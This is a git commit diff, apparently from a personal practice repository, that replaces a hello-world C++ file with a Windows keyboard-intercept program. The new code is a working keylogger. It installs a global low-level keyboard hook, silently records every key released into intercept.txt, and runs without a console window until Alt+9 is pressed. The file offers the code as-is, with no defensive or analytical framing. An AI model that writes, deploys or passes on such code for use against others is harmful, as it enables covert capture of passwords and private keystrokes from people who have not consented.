70372d8a272a72a2e3788878b98ca2a0a0b7611c
syedmeesamali <syedmeesamali@yahoo.com>
2024-04-01 23:47:20 +0300

    Keyboard intercept program - Win32 api usage

--- 4_Tools/1_Keyboard/keyboard.cpp
+++ 4_Tools/1_Keyboard/keyboard.cpp
@@ -1,6 +1,35 @@
-#include<iostream>
-int main()
+#define _WIN32_WINNT 0x500
+#include<windows.h>
+#include<fstream>
+#pragma comment(lib,"user32.lib")
+using namespace std;
+
+ofstream out("intercept.txt", ios::out);
+
+LRESULT CALLBACK ProcessKB(int ncode, WPARAM event, LPARAM kb)
 {
-    std::cout << "First from CPP";
-    return 0;
+    PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)kb;
+    if (event == WM_KEYUP) out << (char)p -> vkCode;
+    return CallNextHookEx(NULL, ncode, event, kb);
+}
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPreviousInstance, LPSTR lpCmdLine, int nShowCmd)
+{
+    MSG msg;
+    out << "Intercepted keyboard: \n\n";
+    HHOOK captest = SetWindowsHookEx(WH_KEYBOARD_LL, ProcessKB, hInstance, 0);
+
+    RegisterHotKey(NULL, 1, MOD_ALT, 0x39);
+    while(GetMessage(&msg, NULL, 0, 0)!=0)
+    {
+        if (msg.message == WM_HOTKEY)
+        {
+            UnhookWindowsHookEx(captest);
+            out << "\n\n End intercept \n\n";
+            out.close();
+            return 0;
+        }
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
 }
